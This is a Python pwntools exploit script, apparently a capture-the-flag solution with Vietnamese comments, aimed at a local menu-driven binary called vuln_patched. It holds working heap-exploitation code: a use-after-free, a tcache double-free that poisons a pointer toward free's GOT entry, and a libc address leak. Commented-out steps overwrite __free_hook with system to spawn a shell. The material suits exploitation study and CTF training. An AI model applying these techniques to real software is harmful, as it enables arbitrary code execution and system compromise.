#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

r = process(exe.path)

gdb.attach(r, gdbscript='''
vis
''')
           
def newAdmin():
    r.sendlineafter(b'Choice: ', b'1')

def newUser(name):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendafter(b'What is your name: ', name)

def printAdmin():
    r.sendlineafter(b'Choice: ', b'3')
    
def editStudent(name):
    r.sendlineafter(b'Choice: ', b'4')
    r.sendafter(b'What is your name: ', name)
    
def printStudent():
    r.sendlineafter(b'Choice: ', b'5')
    return r.recvline()

def deleteAdmin():
    r.sendlineafter(b'Choice: ', b'6')


def deleteUser():
    r.sendlineafter(b'Choice: ', b'7')

### Ý tưởng 1 ###
#newUser(b'AuDuc')
#deleteUser()
#newAdmin()

#getFlag = 0x40084a
#editStudent(p64(0) + p64(getFlag))
#print(printAdmin())
#####

### Ý tưởng 2###
newUser(b'AuDuc')
deleteUser()
deleteUser()

free_got = 0x000000602018
editStudent(p64(free_got))

newAdmin()
newUser(b'A')
free_addr = printStudent().split(b'name is ')[1][1:-1]
free_addr = u64(b'\x50' + free_addr + b'\x00\x00')
print('free leak: ', hex(free_addr))
libc.address = free_addr - libc.sym['free']
print('Libc base: ', hex(libc.address))

#editStudent(p64(libc.sym['free']))

#deleteAdmin()

#newUser(b'A'*8)
#deleteUser()
#deleteUser()

#editStudent(p64(libc.sym['__free_hook']))

#newUser(b'A'*8)
#newUser(p64(libc.sym['system']))

#newUser(b'/bin/sh\x00')

#deleteUser()

r.interactive()